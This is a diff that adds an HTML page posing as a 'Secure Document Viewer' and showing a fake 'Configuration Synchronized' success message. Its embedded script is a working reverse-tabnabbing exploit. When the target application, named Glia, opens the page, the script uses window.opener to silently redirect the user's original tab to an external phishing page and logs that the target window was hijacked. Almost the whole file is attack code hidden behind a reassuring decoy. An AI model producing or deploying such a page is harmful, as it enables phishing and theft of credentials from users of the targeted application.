@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Document Viewer</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; text-align: center; }
+        .success-box { max-width: 500px; margin: auto; padding: 20px; border: 2px solid #28a745; background: #d4edda; color: #155724; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="success-box">
+        <h2>✅ Configuration Synchronized</h2>
+        <p>You can now safely close this tab and return to your primary session window.</p>
+    </div>
+
+    <script>
+        // THE REVERSE TABNABBING MECHANISM
+        // Executes immediately when Glia spawns this window
+        if (window.opener) {
+            try {
+                // Silently rewrite the parent Glia tab to your destination page
+                window.opener.location = "https://wrathsec.github.io/postmessage/phish.html";
+                console.log("[+] Target window successfully hijacked!");
+            } catch (e) {
+                console.error("[-] Hijack blocked. Browser enforced a cross-origin isolation policy.");
+            }
+        } else {
+            console.log("[-] No window.opener reference detected.");
+        }
+    </script>
+
+</body>
+</html>
